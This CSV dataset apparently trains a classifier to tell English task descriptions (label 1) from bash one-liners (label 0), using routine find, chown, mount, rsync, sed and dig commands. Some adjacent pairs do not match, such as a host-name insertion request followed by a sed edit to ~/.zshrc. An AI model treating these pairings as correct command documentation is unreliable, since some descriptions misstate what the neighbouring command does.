value,target
"Find all files in the current directory tree whose size is greater than 1MB, and move them to the ""files"" folder",1
find . -size +1M -exec mv {} files \+,0
Search for first match of the regex 're' in all *.coffee files under current directory,1
find . -name '*.coffee' -exec awk '/re/ {print;exit}' {} \;,0
Search the current directory tree for files and directories with permissions 775,1
find .  -perm 775 -print,0
list any files modified since /bin/sh was last modified,1
find . -newer /bin/sh,0
remove filetype suffix (last dot and following characters if any) from filename,1
echo $filename | rev | cut -f 2- -d '.' | rev,0
"echo -n ""logdir"" | md5sum - | awk '{print $1}'",0
output the system host name and date to the console,1
echo Hostname=$(hostname) LastChecked=$(date),0
"Replace all instances of "";"" with ""\n"" in ""bla@some.com;john@home.com""",1
"echo ""bla@some.com;john@home.com"" | sed -e 's/;/\n/g'",0
cat $i | wc -l,0
find all *.foo files under current directory and print their contents,1
cat $(find . -name '*.foo'),0
"cat `find . -name ""*.php""` | wc -l",0
"cat <(fgrep -i -v ""$command"" <(crontab -l)) <(echo ""$job"") | crontab -",0
sudo chown root:wheel adbind.bash,0
"Recursively change the owner group of ""/var/www"" of to ""www-data""",1
sudo chown -R www-data:www-data /var/www,0
recursively change owner of the directory ~/.npm to the current user,1
sudo chown -R $(whoami) ~/.npm,0
sudo mount -o remount -o exec /dev/sda7,0
"make directories to ""x/p/q"" as needed",1
mkdir -p x/p/q,0
mkdir temp,0
"mkdir -p -- ""$(dirname -- ""$f"")""",0
"Make directories ""/tmp/A"", ""/tmp/B"", ""/tmp/C"", and ""/tmp/ dir with spaces""",1
"mkdir /tmp/A /tmp/B /tmp/C ""/tmp/ dir with spaces""",0
ls -l /proc/self/fd/,0
"Print the second line of output of ""ls -l""",1
ls -l | head -2 | tail -1,0
list absolute path of files in the current directory,1
ls -1 | xargs readlink -f,0
ls -d */|sed 's|[/]||g',0
"archive ""myfile"" to ""/foo/bar/"" and create directory ""/foo/bar/"" if ""/foo/"" exists",1
rsync -a myfile /foo/bar/,0
rsync --sparse sparse-1 sparse-1-copy,0
rsync -av --exclude='path1/to/exclude' --exclude='path2/to/exclude' source destination,0
rsync symdir/ symdir_output/ -a --copy-links -v,0
"Read standard input until a null character is found and save the result in variable ""line""",1
read -r -d $'\0',0
"Prompt the user with a question ""This is the question I want to ask?"" and save ""y"" or ""n"" in variable ""REPLY"" in zsh",1
"read REPLY\?""This is the question I want to ask?""",0
"Read a line from standard input into variable ""message"" with escaped prompt ""Please Enter a Message: \n\b""",1
"read -p ""$(echo -e 'Please Enter a Message: \n\b')"" message",0
read -p 'BGG enter something:' -r data,0
"Search for ""foo"" in every file in the current directory and number the output",1
grep foo * | nl,0
"Look for any instance of ""HIGHMEM"" in the current kernel's compile-time config file.",1
grep “HIGHMEM” /boot/config-`uname -r`,0
"Search ""file1"" for lines matching regex patterns listed in ""file2"" and list the unique results (sorted alphabetically)",1
grep -f file2 file1 | sort | uniq,0
"grep -Ril ""text-to-find-here"" /",0
display differences between directories dir1 and dir2.,1
diff -r dir1 dir2,0
"compare ""$source_file"" and ""$dest_file"" line by line",1
"diff ""$source_file"" ""$dest_file""",0
"print the difference between line 2 and 3 in file ""$f""",1
diff <(fold -w1 <(sed '2q;d' $f)) <(fold -w1 <(sed '3q;d' $f)) | awk '/[<>]/{printf $2}',0
diff -ENwbur repos1/ repos2/,0
Change to directory 'foo' and print to terminal all received on standard input,1
cd foo | cat,0
"cd -P ""$dir1""",0
"Go to /the/project/root//data, which in most filesystems/operating systems will be the same as cd /the/project/root/data",1
cd /the/project/root//data,0
"Change directory to the ""lib"" directory located two parent directories above the path to command ""perl""",1
report file system containing the current directory disk usage,1
df .,0
df --total,0
display source and mount point of the file system containing /some/path.,1
"df '/some/directory' | awk '{print $1, $6}'",0
df $PWD | awk '/[0-9]%/{print $(NF-2)}',0
"Verbosely change ownership of ""$file"" to ""root""",1
"chown -v root ""$file""",0
"copy the owner and group of ""oldfile"" to ""newfile""",1
chown --reference=oldfile newfile,0
"change owner to ""$1"" and group to ""httpd"" of "".htaccess""",1
chown $1:httpd .htaccess,0
"Change the owner of ""$JBOSS_CONSOLE_LOG"" to ""$JBOSS_USER""",1
chown $JBOSS_USER $JBOSS_CONSOLE_LOG,0
split -b 10 input.txt xxx/split-file,0
split -b 500M -d -a 4 INPUT_FILE_NAME input.part.,0
"Split ""$INFILE"" into files of at most ""$SPLITLIMT"" with a numeric suffix and a prefix ""x_""",1
split -d -l $SPLITLIMT $INFILE x_,0
split -n 1000000 /etc/gconf/schemas/gnome-terminal.schemas,0
"Create a symbolic link named ""/usr/bin/my-editor"" to file ""/usr/share/my-ditor/my-editor-executable""",1
ln -s /usr/share/my-ditor/my-editor-executable /usr/bin/my-editor,0
"forcible create a symbolic link named ""/etc/file.conf"" to file ""/etc/configuration/file.conf""",1
ln -fs /etc/configuration/file.conf /etc/file.conf,0
"ln -sf ""$(readlink -f ""$link"")"" ""$link""",0
"force create a symbolic link without dereferencing named ""alpha"" to ""alpha_2""",1
ln -nsf alpha_2 alpha,0
set -v,0
Stores date of last month day in the 'lastdaymonth' variable.,1
"set lastdaymonth=`cal $month $year  |tr -s "" "" ""\n""|tail -1`",0
set -e,0
saves path to the $SCRIPT file in the SCRIPTPATH variable.,1
"set SCRIPTPATH=`dirname ""$SCRIPT""`",0
Ssh into localhost on port 10022,1
ssh -p 10022 localhost,0
"Ssh into ""hostname"" as user ""buck""",1
ssh -l buck hostname,0
ssh -S my-ctrl-socket -O check jm@sampledomain.com,0
"sSH into server ""app1"" as the current user",1
ssh app1,0
"sort file ""foo.txt"" by line to standard output",1
sort foo.txt,0
sort ips.txt | uniq -c,0
sort file1 file2 | uniq -d | wc -l,0
sort inputfile | uniq | sort -o inputfile,0
"check if ""/path/to/dir"" is a nfs mount point",1
mount -l | grep 'type nfs' | sed 's/.* on \([^ ]*\) .*/\1/' | grep /path/to/dir,0
display what flags mount points are mounted with,1
mount -l,0
print the path of all the network mounts,1
"mount | sed -n -e ""s/\/\/mynetaddr on \([^ ]*\).*$/\1/p""",0
"Remount ""/media/Working/"" with a umask of 000",1
"mount /media/Working/ -oremount,umask=000",0
"Check if the contents of file ""subset"" is a subset of file ""set""",1
comm -23 <(sort subset | uniq) <(sort set | uniq) | head -1,0
"count the number of equal lines in ""file1.txt"" and ""file2.txt""",1
comm -12 <(sort file1.txt) <(sort file2.txt) | wc -l,0
"print lines unique and common to sorted files ""file1"" and  ""file2""",1
comm file1 file2,0
comm -12 <(find ~/bin/FilesDvorak/.* -maxdepth 0) <(find ~/.PAST_RC_files/.*),0
Gets IP addresses of all network interfaces.,1
"ifconfig | grep -E ""([0-9]{1,3}\.){3}[0-9]{1,3}"" | grep -v 127.0.0.1 | awk '{ print $2 }' | cut -f2 -d:",0
Finds IP address of 'en0' network interface.,1
ifconfig en0 | grep inet | grep -v inet6 | awk '{print $2}',0
ifconfig | grep ad.*Bc | cut -d: -f2 | awk '{ print $1}',0
gets IP address of 'en1' network interface.,1
"ifconfig en1 | awk '{ print $2}' | grep -E -o ""([0-9]{1,3}[\.]){3}[0-9]{1,3}""",0
"insert the current host name on line 15 of ""test.html""",1
"sed -i ""s#\(export\ PATH=\""\)\(.*\)#\1/home/$(whoami)/bin:~/\.local/bin:\2#"" ~/.zshrc",0
"Replace all newlines with spaces in the contents of ""file""",1
sed -e '{:q;N;s/\n/ /g;t q}' file,0
sed --in-place '/some string here/d' yourfile,0
shows state of 'extglob' shell option.,1
shopt -o extglob,0
shopt -s nullglob extglob,0
shopt compat31,0
shopt -s expand_aliases,0
history 10 | cut -c 8-,0
"search history for ""part_of_the_command_i_still_remember_here""",1
history | grep 'part_of_the_command_i_still_remember_here',0
"replace ""  "" with "" $UID "" in the output of ""history""",1
"View history using ""vim""",1
history | vim -,0
"print 3 newline separated ""y""s",1
yes | head -3,0
"yes ""$OPTARG"" | head -$opt",0
"print 2 lines of ""123456789""",1
yes 123456789 | head -2,0
yes | rm -r *.txt,0
ping youhostname.local,0
"ping 8.8.8.8 | awk '{split($7,a,""[=.]"");if (a[2]>58) print a[2], strftime()}'",0
"send 4 ping packets of size 2 to ""www.google.com"" on a Solaris machine",1
ping google.com | awk -f packet_loss.awk,0
mv svnlog.py svnlog,0
"mv ""$2"" ""`dirname $1`""",0
"mv ""/tmp/`basename $1`"" ""`dirname $2`""",0
"rename ""original.filename"" to ""new.original.filename""",1
"mv {,new.}original.filename",0
join -t: <(sort file1) <(sort file2),0
"join lines in file ""aa"" with lines in file ""bb"" if the lines share a common first word",1
join <(sort aa) <(sort bb),0
"join lines in file ""A"" with lines in file ""B"" if the lines share a common first word",1
join <(sort -n A) <(sort -n B),0
"merge lines whose first comma-separated field in file 'in1' also appears as a first comma-separated in file 'in2' - both files must be sorted, and the output format of each line will be: first field of in1, second field of in2, and third field of in2.",1
"join -t, -o 1.1,1.2,2.3 in1 in2",0
"copy the executable ""python2.7"" in $PATH to ""myenv/bin/python""",1
cp `which python2.7` myenv/bin/python,0
"Copy src_dir recursively to dest_dir, but without overwriting existing files.",1
cp -nr src_dir dest_dir,0
"copy file or folder linked to by ""file"" to ""file""",1
cp -rf --remove-destination `readlink file` file,0
"cp -R ""$1"" ""$2""",0
"awk '{if (NR!=1) {print}}' $in_file | split -d -a 5 -l 100000 - $in_file""_""",0
Takes first text field from file 'file.txt' as a domain name and gets short A record for this one.,1
awk '{print $1}' file.txt | xargs dig +short,0
"awk '{printf ""%s "", $0} END {printf ""\n""}' inputfile",0
"file 'mydatafile' has a number on each line, display the sum of these numbers.",1
awk '{s+=$1} END {print s}' mydatafile,0
print NS record for domain 'domain.' from 'some.other.ip.address' nameserver,1
dig @some.other.ip.address domain. ns,0
Print A record for domain 'domain.' from 'ns1.newnameserver' nameserver,1
dig @ns1.newnameserver domain. a,0
"get domain ""$domain"" IP address",1
"dig +short ""$domain""",0
Read lookup requests from text file '1.txt' and uses them to fetch TXT records.,1
write a random list of numbers to /tmp/lst and stdout.,1
seq 1 10 | sort -R | tee /tmp/lst |cat <(cat /tmp/lst) <(echo '-------') **...**,0
seq $(tail -1 file)|diff - file|grep -Po '.*(?=d)',0
print numbers from 1 to 5 without separating spaces,1
"seq 5 | awk '{printf ""%s"", $0} END {print """"}'",0
Print space separated numbers from 1 to 10,1
seq 10 | xargs echo,0
find all files under /path/to/base/dir and change their permission to 644,1
